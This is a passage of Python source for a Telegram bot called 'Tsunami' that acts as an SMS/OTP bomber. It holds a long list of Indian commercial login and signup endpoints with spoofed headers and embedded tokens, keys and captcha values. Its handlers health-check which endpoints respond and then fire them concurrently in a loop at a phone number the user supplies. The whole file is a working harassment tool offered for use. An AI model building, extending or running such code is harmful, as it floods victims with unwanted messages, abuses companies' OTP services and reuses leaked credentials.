      "url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?flw=vkyc",
      "headers":{"Host":"www.kotak.com",
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "User-Agent":UA_C2,"X-Requested-With":"XMLHttpRequest",
        "Origin":"https://www.kotak.com",
        "Referer":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/otp-mobile.action?flw=vkyc"},
      "data":""})

    # ---------- 45. HappyEasyGo ----------
    E.append({"name":"HappyEasyGo","method":"GET",
      "url":"https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{t}&verifycode=FDCA",
      "headers":{"Host":"m.happyeasygo.com",
        "accept":"application/json, text/plain, */*","x-device":"mobile",
        "user-agent":UA_C2,"referer":"https://m.happyeasygo.com/register"},
      "data":None})

    # ---------- 46. MakeMyTrip ----------
    E.append({"name":"MakeMyTrip","method":"POST",
      "url":"https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
      "headers":{"Host":"mapi.makemytrip.com",
        "deviceid":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","currency":"inr",
        "language":"eng","authorization":"h4nhc9jcgpAGIjp",
        "visitor-id":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","region":"in",
        "accept":"application/json","user-agent":UA_C2,
        "content-type":"application/json","origin":"https://www.makemytrip.com",
        "referer":"https://www.makemytrip.com/"},
      "data":'{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})

    # ---------- 47. Ola ----------
    E.append({"name":"Ola","method":"POST",
      "url":"https://accounts.olacabs.com/api/login",
      "headers":{"Host":"accounts.olacabs.com",
        "x-fingerprint-id":"3664542227",
        "csrf-token":"v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I",
        "x-requested-with":"XMLHttpRequest","user-agent":UA_C2,
        "content-type":"application/json","accept":"*/*",
        "origin":"https://accounts.olacabs.com",
        "referer":"https://accounts.olacabs.com/?serviceType=p2p"},
      "data":'{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN","headers":{},"verificationId":null,"captchaInfo":{"gcaptcha":"03AGdBq26mRWBEeBGcFIqhyewjUTfv","fingerPrint":3664542227,"storageId":"16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}}'})

    # ---------- 48. EasyMyTrip ----------
    E.append({"name":"EasyMyTrip","method":"POST",
      "url":"https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
      "headers":{"Host":"mybookings.easemytrip.com",
        "accept":"text/plain, */*; q=0.01","x-requested-with":"XMLHttpRequest",
        "user-agent":UA_C2,"content-type":"application/json; charset=UTF-8",
        "origin":"https://mybookings.easemytrip.com",
        "referer":"https://mybookings.easemytrip.com/MyBooking/Profile"},
      "data":'{"emailph":"{t}"}'})

    # ---------- 49. Oyo ----------
    E.append({"name":"Oyo","method":"POST",
      "url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en",
      "headers":{"Host":"www.oyorooms.com","user-agent":UA_C2,
        "content-type":"text/plain;charset=UTF-8","accept":"*/*",
        "origin":"https://www.oyorooms.com",
        "referer":"https://www.oyorooms.com/login"},
      "data":'{"phone":"{t}","country_code":"+91","nod":4}'})

    # ---------- 50. Dominos ----------
    E.append({"name":"Dominos","method":"POST",
      "url":"https://api.dominos.co.in/loginhandler/forgotpassword",
      "headers":{"Host":"api.dominos.co.in","api_key":"d2aeb489bb8df385",
        "secretkey":"dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
        "source":"PWA18#upsellC","client_type":"web app-chrome",
        "user-agent":UA_C2,"accept":"application/json, text/plain, */*",
        "content-type":"application/json","origin":"https://m.dominos.co.in",
        "referer":"https://m.dominos.co.in/"},
      "data":'{"lastName":"","mobile":"{t}","firstName":""}'})

    # ---------- 51. PizzaHut ----------
    E.append({"name":"PizzaHut","method":"POST",
      "url":"https://api.pizzahut.io/v1/otp/generate",
      "headers":{"Host":"api.pizzahut.io","x-environment-flag":"production",
        "user-agent":UA_C2,"content-type":"application/json; charset=utf-8",
        "accept":"*/*","origin":"https://www.pizzahut.co.in"},
      "data":'{"phone":"+91{t}"}'})

    # ---------- 52. KFC ----------
    E.append({"name":"KFC","method":"POST",
      "url":"https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
      "headers":{"Host":"online.kfc.co.in",
        "accept":"application/json, text/plain, */*","user-agent":UA_C2,
        "content-type":"application/json;charset=UTF-8",
        "origin":"https://online.kfc.co.in",
        "referer":"https://online.kfc.co.in/login"},
      "data":'{"phoneNumber":"{t}","AuthorizedFor":"3","Resend":"false"}'})

    # ---------- 53. BurgerKing ----------
    E.append({"name":"BurgerKing","method":"POST",
      "url":"https://consumer-apis.burgerking.in/api/v1/user/signUp",
      "headers":{"Host":"consumer-apis.burgerking.in","appversion":"1.6",
        "content-type":"application/json","accept":"application/json, text/plain, */*",
        "platform":"web","user-agent":UA_C2,
        "origin":"https://www.burgerking.in",
        "referer":"https://www.burgerking.in/"},
      "data":'{"phone_no":{t}}'})

    # ---------- 54. Dineout ----------
    E.append({"name":"Dineout","method":"POST",
      "url":"https://www.dineout.co.in/xhrajaxrequest/user_signup",
      "headers":{"Host":"www.dineout.co.in",
        "accept":"application/json, text/javascript, */*; q=0.01",
        "x-requested-with":"XMLHttpRequest","user-agent":UA_C2,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
        "origin":"https://www.dineout.co.in",
        "referer":"https://www.dineout.co.in/"},
      "data":"name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={t}"})

    # ---------- 55. Purplle ----------
    E.append({"name":"Purplle","method":"GET",
      "url":"https://www.purplle.com/api/account/authorization/send_otp?phone={t}&action=register",
      "headers":{"Host":"www.purplle.com","device_id":"TEC3cjyVJhEFPGsSHw",
        "user-agent":UA_C2,"accept":"application/json, text/plain, */*",
        "referer":"https://www.purplle.com/login"},
      "data":None})

    # ---------- 56. AngelBroking ----------
    E.append({"name":"AngelODA","method":"POST",
      "url":"https://www.angelbroking.com/form-gateways/oda-form.php",
      "headers":{"Host":"www.angelbroking.com",
        "origin":"https://www.angelbroking.com",
        "content-type":"application/x-www-form-urlencoded",
        "user-agent":UA_C2,
        "referer":"https://www.angelbroking.com/open-demat-account"},
      "data":"name=Tsunami+Bomber&mobile={t}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"})

    # ---------- 57. ASVM ----------
    E.append({"name":"ASVM","method":"POST",
      "url":"http://asvmfaizabad.org/register.php",
      "headers":{"Host":"asvmfaizabad.org","Origin":"http://asvmfaizabad.org",
        "Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_C2,
        "Referer":"http://asvmfaizabad.org/register.php"},
      "data":"sname=Tsunami&sclass=XII&sphone={t}&spassword=tsunamiastronomia&ssection=A&submit="})

    # ---------- 58. Lenskart old ----------
    E.append({"name":"Lenskart2","method":"POST",
      "url":"https://api.lenskart.com/v2/customers/sendOtp",
      "headers":{"Host":"api.lenskart.com","origin":"https://www.lenskart.com",
        "x-b3-traceid":"991603826710278","user-agent":UA_OLD,
        "content-type":"application/json;charset=UTF-8",
        "accept":"application/json, text/plain, */*","x-api-client":"mobilesite",
        "referer":"https://www.lenskart.com/customer/account/login"},
      "data":'{"telephone":"{t}"}'})

    # ---------- 59. Ajio old ----------
    E.append({"name":"AjioOld","method":"POST",
      "url":"https://login.web.ajio.com/api/auth/signupSendOTP",
      "headers":{"Host":"login.web.ajio.com","accept":"application/json",
        "Origin":"https://www.ajio.com","User-Agent":UA_OLD,
        "content-type":"application/json",
        "Referer":"https://www.ajio.com/signup"},
      "data":'{"firstName":"Djdhdjsjsjsjsk","login":"xjdjdosh@gmail.com","password":"spider##1213","genderType":"Female","mobileNumber":"{t}","requestType":"SENDOTP"}'})

    # ---------- 60. SonyLIV2 ----------
    E.append({"name":"SonyLIV2","method":"POST",
      "url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
      "headers":{"Host":"apiv2.sonyliv.com",
        "device_id":"5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
        "security_token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ",
        "user-agent":UA_C2,"content-type":"application/json",
        "accept":"application/json, text/plain, */*",
        "session_id":"18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW-1603827494316",
        "x-via-device":"true","app_version":"3.1.42.3",
        "origin":"https://www.sonyliv.com"},
      "data":'{"mobileNumber":"{t}","channelPartnerID":"MSMIND","country":"IN","timestamp":"2020-10-27T19:39:13.355Z"}'})

    # ==========================================================
    # NEW 2024 ENDPOINTS (20 added)
    # ==========================================================
    E.append({"name":"Zepto","method":"POST",
      "url":"https://api.zeptonow.com/api/v3/user/otp/generate",
      "headers":{"Host":"api.zeptonow.com","content-type":"application/json",
        "accept":"*/*","user-agent":UA_C2,"origin":"https://www.zeptonow.com",
        "referer":"https://www.zeptonow.com/"},
      "data":'{"phone":"+91{t}"}'})

    E.append({"name":"Blinkit","method":"POST",
      "url":"https://blinkit.com/api/v1/auth/phone",
      "headers":{"Host":"blinkit.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://blinkit.com","referer":"https://blinkit.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Meesho","method":"POST",
      "url":"https://api.meesho.com/v1/users/otp",
      "headers":{"Host":"api.meesho.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.meesho.com","referer":"https://www.meesho.com/"},
      "data":'{"phone":"+91{t}","action":"signup"}'})

    E.append({"name":"Nykaa","method":"POST",
      "url":"https://api.nykaa.com/api/otp/send",
      "headers":{"Host":"api.nykaa.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.nykaa.com","referer":"https://www.nykaa.com/"},
      "data":'{"mobile":"{t}","countryCode":"+91"}'})

    E.append({"name":"PharmEasy","method":"POST",
      "url":"https://consumer-api.pharmeasy.in/v1/auth/sendOtp",
      "headers":{"Host":"consumer-api.pharmeasy.in",
        "content-type":"application/json","accept":"application/json",
        "user-agent":UA_C2,"origin":"https://pharmeasy.in",
        "referer":"https://pharmeasy.in/"},
      "data":'{"phone":"{t}","countryCode":"+91"}'})

    E.append({"name":"1mg","method":"POST",
      "url":"https://www.1mg.com/api/v1/auth/otp",
      "headers":{"Host":"www.1mg.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.1mg.com","referer":"https://www.1mg.com/"},
      "data":'{"mobile":"{t}"}'})

    E.append({"name":"Cred","method":"POST",
      "url":"https://api.cred.club/otp/send",
      "headers":{"Host":"api.cred.club","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://cred.club","referer":"https://cred.club/"},
      "data":'{"phone":"+91{t}"}'})

    E.append({"name":"Groww","method":"POST",
      "url":"https://api.groww.in/v1/auth/otp",
      "headers":{"Host":"api.groww.in","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://groww.in","referer":"https://groww.in/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Cars24","method":"POST",
      "url":"https://api.cars24.com/api/v2/auth/otp",
      "headers":{"Host":"api.cars24.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.cars24.com","referer":"https://www.cars24.com/"},
      "data":'{"mobile":"{t}"}'})

    E.append({"name":"LenskartNew","method":"POST",
      "url":"https://api.lenskart.com/v3/customers/otp",
      "headers":{"Host":"api.lenskart.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.lenskart.com","referer":"https://www.lenskart.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"FlipkartClean","method":"POST",
      "url":"https://www.flipkart.com/api/6/user/otp",
      "headers":{"Host":"www.flipkart.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.flipkart.com",
        "referer":"https://www.flipkart.com/account/login"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Myntra","method":"POST",
      "url":"https://www.myntra.com/gateway/v2/user/otp",
      "headers":{"Host":"www.myntra.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.myntra.com","referer":"https://www.myntra.com/"},
      "data":'{"mobile":"{t}"}'})

    E.append({"name":"UrbanCompanyNew","method":"POST",
      "url":"https://www.urbancompany.com/api/v3/otp/send",
      "headers":{"Host":"www.urbancompany.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.urbancompany.com",
        "referer":"https://www.urbancompany.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Practo","method":"POST",
      "url":"https://www.practo.com/api/v1/otp",
      "headers":{"Host":"www.practo.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.practo.com","referer":"https://www.practo.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Housing","method":"POST",
      "url":"https://api.housing.com/api/v1/otp",
      "headers":{"Host":"api.housing.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://housing.com","referer":"https://housing.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"MagicBricks","method":"POST",
      "url":"https://www.magicbricks.com/api/otp/send",
      "headers":{"Host":"www.magicbricks.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.magicbricks.com",
        "referer":"https://www.magicbricks.com/"},
      "data":'{"mobile":"{t}"}'})

    E.append({"name":"NoBroker","method":"POST",
      "url":"https://www.nobroker.in/api/v1/otp",
      "headers":{"Host":"www.nobroker.in","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.nobroker.in","referer":"https://www.nobroker.in/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"PolicyBazaar","method":"POST",
      "url":"https://www.policybazaar.com/api/otp",
      "headers":{"Host":"www.policybazaar.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.policybazaar.com",
        "referer":"https://www.policybazaar.com/"},
      "data":'{"mobile":"{t}"}'})

    E.append({"name":"ACKO","method":"POST",
      "url":"https://api.acko.com/v1/otp/send",
      "headers":{"Host":"api.acko.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.acko.com","referer":"https://www.acko.com/"},
      "data":'{"phone":"{t}"}'})

    E.append({"name":"Khatabook","method":"POST",
      "url":"https://api.khatabook.com/v1/auth/otp",
      "headers":{"Host":"api.khatabook.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://khatabook.com","referer":"https://khatabook.com/"},
      "data":'{"phone":"{t}"}'})

    return E


ENDPOINTS = build_endpoints()


# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=300, limit_per_host=30, ttl_dns_cache=300, ssl=False,
        )
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session


async def fire_endpoint(ep: dict, target: str) -> tuple:
    """Returns (success: bool, status: int)."""
    name = ep["name"]
    # respect per-endpoint gap
    now = time.time()
    if now - ENDPOINT_LAST_HIT[name] < MIN_GAP_PER_ENDPOINT:
        return (False, 0)
    ENDPOINT_LAST_HIT[name] = now

    url = ep["url"].replace("{t}", target)
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)
    try:
        session = await get_http_session()
        async with session.request(
            method=ep["method"], url=url, headers=headers,
            data=data if data else None, ssl=False,
        ) as resp:
            status = resp.status
            await resp.read()
            success = status in (200, 201, 202, 204)
            if success:
                ENDPOINT_SUCCESS[name] += 1
            else:
                ENDPOINT_FAIL[name] += 1
            return (success, status)
    except Exception:
        ENDPOINT_FAIL[name] += 1
        return (False, 0)


async def check_endpoint_live(ep: dict, target: str) -> tuple:
    name = ep["name"]
    url = ep["url"].replace("{t}", target)
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)
    try:
        session = await get_http_session()
        async with session.request(
            method=ep["method"], url=url, headers=headers,
            data=data if data else None, ssl=False,
        ) as resp:
            body = await resp.text()
            snippet = body[:100].replace("\n", " ")
            keywords = ["success", "otp", "sent", "true", "verification",
                        "message", "valid", "code", "sms"]
            is_live = (resp.status in (200, 201, 202)
                       and any(k in body.lower() for k in keywords))
            return (name, is_live, resp.status, snippet)
    except Exception as e:
        return (name, False, 0, type(e).__name__)


async def run_health_check(target: str) -> list:
    global LIVE_ENDPOINTS, HEALTH_DONE
    logger.info(f"?? Health-checking {len(ENDPOINTS)} endpoints...")
    tasks = [check_endpoint_live(ep, target) for ep in ENDPOINTS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    live = []
    for (name, is_live, status, snippet), ep in zip(results, ENDPOINTS):
        if is_live:
            live.append(ep)
            ENDPOINT_SUCCESS[name] += 1
            logger.info(f"  ? {name} — {status} — {snippet[:60]}")
        else:
            ENDPOINT_FAIL[name] += 1
    LIVE_ENDPOINTS = live
    HEALTH_DONE = True
    logger.info(f"?? LIVE: {len(live)}/{len(ENDPOINTS)}")
    return live


async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if isinstance(r, tuple) and r[0])


# ================== HANDLERS ==================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await update.message.reply_text(
        f"?? Namaste {u.first_name}!\n\n"
        f"?? *TSUNAMI — ULTRA FAST LIVE* ??\n\n"
        f"?? Endpoints loaded: {len(ENDPOINTS)}\n"
        f"? Concurrency: {CONCURRENCY}\n"
        f"?? Per-endpoint gap: {MIN_GAP_PER_ENDPOINT}s\n\n"
        f"Commands:\n"
        f"/bomb — start (auto health check first)\n"
        f"/stop — cancel\n"
        f"/status — progress\n"
        f"/checklive — re-run health check\n"
        f"/endpoints — list all\n"
        f"/help — guide",
        parse_mode="Markdown"
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "?? *How Ultra-Fast-Live Works*\n\n"
        "1. /bomb ? send number\n"
        "2. Bot checks which endpoints are actually live (~15s)\n"
        "3. Only *live* endpoints are used for bombing\n"
        "4. Smart rotation — no endpoint hit twice within "
        f"{MIN_GAP_PER_ENDPOINT}s\n"
        "5. Runs until /stop or session cap\n\n"
        "?? *Tip:* First check is slow, but delivery is higher.",
        parse_mode="Markdown"
    )


async def cmd_endpoints(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chunk = ""
    for i, ep in enumerate(ENDPOINTS, 1):
        chunk += f"{i}. {ep['name']}\n"
        if len(chunk) > 3500:
            await update.message.reply_text(f"```\n{chunk}```", parse_mode="Markdown")
            chunk = ""
    if chunk:
        await update.message.reply_text(f"```\n{chunk}```", parse_mode="Markdown")


async def cmd_bomb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions.get(uid)
    if s and s.get("running"):
        await update.message.reply_text("?? Session running. /stop first.")
        return
    user_sessions[uid] = {"state": "awaiting_target", "running": False}
    await update.message.reply_text(
        "?? Send target number (10 digits, no +91).\n"
        "?? Auto health-check will run first (~15s).\n"
        "?? /stop to cancel."
    )


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions.get(uid)
    if not s or not s.get("running"):
        await update.message.reply_text("?? No active session.")
        return
    s["running"] = False
    s["cancelled"] = True
    await update.message.reply_text("?? Stopping…")


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions.get(uid)
    if not s or not s.get("running"):
        await update.message.reply_text("?? No active session.")
        return
    elapsed = int(time.time() - s.get("started_at", time.time()))
    live_n = len(LIVE_ENDPOINTS) if LIVE_ENDPOINTS else "?"
    await update.message.reply_text(
        f"?? *Session*\n"
        f"Target: `{s.get('target')}`\n"
        f"Sent: {s.get('sent',0)}\n"
        f"Round: {s.get('round',0)}\n"
        f"Live endpoints: {live_n}/{len(ENDPOINTS)}\n"
        f"Elapsed: {elapsed}s\n"
        f"Rate: {s.get('sent',0) // max(elapsed,1)} req/s",
        parse_mode="Markdown"
    )


async def cmd_checklive(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions.get(uid)
    if not s or not s.get("target"):
        await update.message.reply_text("?? Pehle /bomb karein aur number dein.")
        return
    await update.message.reply_text("?? Health check shuru (~15s)...")
    live = await run_health_check(s["target"])
    names = "\n".join(f"? {ep['name']}" for ep in live) or "? Koi live nahi"
    await update.message.reply_text(
        f"?? Live: {len(live)}/{len(ENDPOINTS)}\n\n{names[:3500]}"
    )


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    if not s or s.get("state") != "awaiting_target":
        return
    if not is_valid_target(text):
        await update.message.reply_text("? 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False,
             sent=0, round=0, started_at=time.time())
    await update.message.reply_text(
        f"?? Target set: `{text}`\n"
        f"?? Health-checking endpoints...",
        parse_mode="Markdown"
    )
    asyncio.create_task(run_bombing(uid, s))


async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    max_sec = SESSION_MAX_MIN * 60

    # ---- Health check if not done ----
    if not HEALTH_DONE:
        live = await run_health_check(target)
        try:
            bot = Bot(token=BOT_TOKEN)
            await bot.send_message(
                uid,
                f"? Health check done: {len(live)}/{len(ENDPOINTS)} live\n"
                f"?? Bombing started!"
            )
        except Exception:
            pass

    active = LIVE_ENDPOINTS if LIVE_ENDPOINTS else ENDPOINTS
    if not active:
        s["running"] = False
        try:
            bot = Bot(token=BOT_TOKEN)
            await bot.send_message(uid, "? No live endpoints found!")
        except Exception:
            pass
        return

    idx = 0
    try:
        while s.get("running"):
            if time.time() - start > max_sec:
                s["running"] = False
                s["auto_stopped"] = True
                break
            s["round"] += 1

            # Build parallel batch from live endpoints
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(active[idx % len(active)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            if DELAY > 0:
                await asyncio.sleep(DELAY)
            if s["round"] % 100 == 0:
                await asyncio.sleep(0.2)
    except Exception as e:
        logger.exception(f"bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = ("?? Stopped" if s.get("cancelled")
                  else f"?? Auto-stop ({SESSION_MAX_MIN}m)" if s.get("auto_stopped")
                  else "? Done")
        top = sorted(ENDPOINT_SUCCESS.items(), key=lambda x: -x[1])[:5]
        top_str = "\n".join(f"  • {n}: {c}" for n, c in top if c > 0)
        await bot.send_message(
            uid,
            f"{reason}!\n\n"
            f"?? Sent *{sent}* requests to `{target}`\n"
            f"?? Rounds: {s.get('round',0)}\n"
            f"? Live endpoints: {len(active)}/{len(ENDPOINTS)}\n"
            f"?? Duration: {elapsed}s\n"
            f"?? Rate: {sent // max(elapsed,1)} req/s\n"
            f"?? Top endpoints:\n{top_str or '  (none delivered)'}",
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ================== STARLETTE + WEBHOOK ==================
async def health(request):
    return PlainTextResponse("OK", status_code=200)


async def root(request):
    return PlainTextResponse("Tsunami ULTRA FAST LIVE ???")


async def startup():
    global telegram_app
    if not WEBHOOK_URL:
        logger.error("RENDER_EXTERNAL_URL missing!")
        return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"

    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    telegram_app.add_handler(CommandHandler("start", cmd_start))
    telegram_app.add_handler(CommandHandler("help", cmd_help))
    telegram_app.add_handler(CommandHandler("bomb", cmd_bomb))
    telegram_app.add_handler(CommandHandler("stop", cmd_stop))
    telegram_app.add_handler(CommandHandler("status", cmd_status))
    telegram_app.add_handler(CommandHandler("checklive", cmd_checklive))
    telegram_app.add_handler(CommandHandler("endpoints", cmd_endpoints))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(
        url=full_url, allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )
    await telegram_app.start()
    logger.info(f"? Webhook set: {full_url}")
    logger.info(f"? {len(ENDPOINTS)} endpoints | CONCURRENCY={CONCURRENCY} | GAP={MIN_GAP_PER_ENDPOINT}s")


async def webhook(request):
    if telegram_app is None:
        return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e:
        logger.exception(f"webhook error: {e}")
    return Response("ok")


async def shutdown():
    global telegram_app, _http_session
    if _http_session and not _http_session.closed:
        await _http_session.close()
    if telegram_app:
        try:
            await telegram_app.stop()
            await telegram_app.shutdown()
        except Exception:
            pass
    logger.info("?? Shutdown")


def create_app() -> Starlette:
    routes = [
        Route("/", root),
        Route("/health", health),
        Route("/healthz", health),
        Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
    ]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])


app = create_app()


if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("? Set BOT_TOKEN env var")
        sys.exit(1)
    logger.info(f"?? Uvicorn on port {PORT}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
